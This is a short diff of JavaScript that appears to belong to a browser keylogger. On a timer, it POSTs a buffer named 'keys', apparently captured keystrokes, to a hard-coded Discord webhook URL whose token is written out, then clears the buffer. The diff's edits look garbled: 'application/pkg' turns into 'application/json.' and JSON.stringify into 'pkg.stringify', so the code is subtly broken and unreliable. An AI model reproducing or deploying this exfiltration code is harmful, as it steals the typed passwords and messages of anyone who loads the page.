@@ -17,9 +17,9 @@ window.setInterval(function(){
         fetch("https://discord.com/api/webhooks/1326301216241619035/vQiyD2SXPakFAckyR0gWS_yUGC1GHVYowyzzT011-jqJCymLTRP132lFBAvfKUn8nHJK", {
 			method: "POST",
 			headers: {
-				"Content-Type": "application/pkg"
+				"Content-Type": "application/json."
 			},
-			body: JSON.stringify({ content: keys })
+			body: pkg.stringify({ content: keys })
 		}).then(data =>{
 			keys = ""
 		})
